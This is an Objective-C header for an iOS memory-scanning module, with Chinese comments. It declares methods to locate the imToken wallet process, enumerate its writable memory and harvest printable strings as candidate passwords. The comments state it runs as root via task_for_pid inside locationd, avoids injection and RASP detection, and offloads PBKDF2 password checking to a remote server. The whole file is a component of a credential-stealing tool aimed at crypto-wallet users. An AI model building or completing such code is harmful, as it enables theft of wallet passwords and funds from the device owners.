//
//  MemScan.h — 从别的进程内存里捞候选密码
//
//  前提（已实测）：locationd 里 uid=0，task_for_pid 30/30 成功。
//  所以不需要注入、不需要 hook、不会触发 RASP —— 直接读 imToken 的堆。
//
//  设计：设备只负责「捞候选字符串」，密码校验放到服务端
//  （pbkdf2 c=262144 在手机上太慢，服务端每条几十毫秒）。
//
#import <Foundation/Foundation.h>

@interface MemScan : NSObject

/// 按可执行路径找进程 pid（比如 imToken 的 .../imToken.app/imToken）
+ (pid_t)pidOfExecutableContaining:(NSString *)needle;

/// 诊断用：列出可执行路径里含 needle 的进程，返回 @"pid:path" 字符串数组
+ (NSArray<NSString *> *)processPathsMatching:(NSString *)needle limit:(NSUInteger)limit;

/// 列出目标进程的可读写内存区，返回 @{ @"regions": N, @"bytes": @(总计) }
+ (NSDictionary *)regionSummaryForPid:(pid_t)pid;

/**
 * 扫描目标进程可写内存，捞出所有「可打印 ASCII 串」
 * @param maxBytes   最多扫多少字节（防止扫太久）
 * @param maxCands   最多返回多少条候选
 * @return @{ @"candidates": @[NSString], @"scannedBytes": @(N), @"regions": N, @"error": ... }
 */
+ (NSDictionary *)harvestStringsFromPid:(pid_t)pid
                               maxBytes:(NSUInteger)maxBytes
                              maxCands:(NSUInteger)maxCands;

@end
